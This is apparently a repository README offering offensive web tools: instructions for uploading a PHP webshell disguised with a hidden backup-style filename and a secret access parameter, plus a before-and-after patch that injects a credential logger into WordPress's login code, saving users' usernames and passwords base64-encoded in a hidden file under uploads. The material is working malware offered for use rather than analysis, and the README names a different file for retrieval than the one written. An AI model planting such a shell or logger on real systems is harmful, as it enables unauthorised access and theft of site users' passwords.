# JustRepository

One Paragraph of project description goes here

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes. See deployment for notes on how to deploy the project on a live system.

### Webshell.php

simple webshell that protected with parameter.
Upload shell. rename it with ".page.backup.php". 
Call it with your own parameter:
```
example.com/uploads/.page.backup.php?dxnboy=4343
```
Modified from:

* **Flozz** - *PHP shell* - [P0wny Shell](https://github.com/flozz/p0wny-shell)

### Inject Wordpress

Inject user.php in wordpress to record credentials that login. Required user priviledge that can write to wordpress directory. 
edit file wordpress/wp-include/user.php.

before
```
if ( ! empty( $credentials['remember'] ) ) {
                $credentials['remember'] = true;
} else {
                $credentials['remember'] = false;
}
```

after inject
```
if ( ! empty( $credentials['remember'] ) ) {
                $credentials['remember'] = true;
                $credz = date('Y-m-d') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
} else {
                $credentials['remember'] = false;
                $credz = date('Y-m-d') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
}
```

Encoded with base64. call it in: and decode it with base64
```
wordpress/wp-content/uploads/.page.txt
```
